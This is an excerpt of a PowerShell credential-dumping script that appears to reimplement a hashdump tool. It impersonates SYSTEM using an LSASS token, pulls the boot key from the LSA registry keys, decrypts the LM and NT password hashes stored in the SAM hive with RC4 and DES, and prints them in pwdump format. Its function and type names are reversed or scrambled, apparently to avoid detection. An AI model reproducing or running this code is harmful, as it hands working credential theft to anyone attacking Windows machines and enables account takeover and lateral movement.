...
"@
    ...
    $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$duplicateTokenHandle)

    $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $duplicateTokenHandle)
...
"@
    ...
    if ($compilerResults.Errors.Count -gt 0) {
        $compilerResults.Errors | ForEach-Object {
...
$odd_parity = @(1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    ...
    return ,((yek_ort_rts $s1), (yek_ort_rts $s2))
}

function yek_ort_rts($s) {
    $key = @()
...
function tpyrCtnes_sd_ed([byte[]]$data, [byte[]]$key) {
    return ,(morfnet_sd_ed $data $key $true)
}

function tpyrCned_sd_ed([byte[]]$data, [byte[]]$key) {
    return ,(morfnet_sd_ed $data $key $false)
}

function morfnet_sd_ed([byte[]]$data, [byte[]]$key, $doEncrypt) {
...
function ssalCyeKgeR-teG([string]$key, [string]$subkey) {
    ...
    if (-not [pUmPdNOREW.Native]::RegOpenKeyEx($nkey, $subkey, 0, $KEYREAD, [ref]$hkey)) {
        $classVal = New-Object Text.Stringbuilder 1024
        [int]$len = 1024
        
        if (-not [pUmPdNOREW.Native]::RegQueryInfoKey($hkey, $classVal, [ref]$len, 0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, 0)) {
            $result = $classVal.ToString()
        } else {
            Write-Error "RegQueryInfoKey failed"
        }
        
        [pUmPdNOREW.Native]::RegCloseKey($hkey) | Out-Null
    } else {
...
function yeKtooB-teG {
    $s = [string]::Join("", $("JD","Skew1","GBG","Data" | ForEach-Object { ssalCyeKgeR-teG "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_" }))
...
function sehsahsrehyteG($u, [byte[]]$hbootkey) {
    ...
    return ,(sehsaHtpmerycD $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey)
}

function sehsaHtpmerycD($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey) {
    [byte[]]$lmhash = $empty_lm
    [byte[]]$nthash = $empty_nt
    
    # LM Hash
    if ($enc_lm_hash) {    
        $lmhash = hSaHgnilpmehTcyrpted $rid $hbootkey $enc_lm_hash $almpassword
    }
    
    # NT Hash
    if ($enc_nt_hash) {
        $nthash = hSaHgnilpmehTcyrpted $rid $hbootkey $enc_nt_hash $antpassword
    }
    
    return ,($lmhash, $nthash)
}

function hSaHgnilpmehTcyrpted($rid, [byte[]]$hbootkey, [byte[]]$enc_hash, [byte[]]$lmntstr) {
    $deskeys = yek_ot_dis $rid
    $md5 = [Security.Cryptography.MD5]::Create()
    $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr)
    $rc4 = 4CRweN $rc4_key
    $obfkey = $rc4.encrypt($enc_hash)
    $hash = (tpyrCned_sd_ed  $obfkey[0..7] $deskeys[0]) + 
            (tpyrCned_sd_ed $obfkey[8..$($obfkey.Length - 1)] $deskeys[1])
    
    return ,$hash
}

function sYEKRus-TEG {
    Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users | 
        ...
        Add-Member ScriptProperty UserName { emanskcat-TEG($this.GetValue("V")) } -PassThru |
...
function sehsahpumD {
    ...
    $output = @()  # Create an empty array to store the output lines.

    sYEKRus-TEG | ForEach-Object {
        $hashes = sehsahsrehyteG $_ $hBootKey
        $line = "{0}:{1}:{2}:{3}:::" -f ($_.UserName, $_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-", "").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-", "").ToLower())
        $output += $line  # Add each line to the output array.
    }

    # Join the output array elements with a newline character to get the final output.
    $output = $output -join "`n"

    return $output  # Return the output without blank lines.
}

if ([priv]::IsUserAnAdmin()) {
    if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) {
        $result = sehsahpumD
        $result -replace '(\r?\n){2,}', "`n"  # Remove multiple consecutive newline characters.
    } else {
        ElevatePrivs
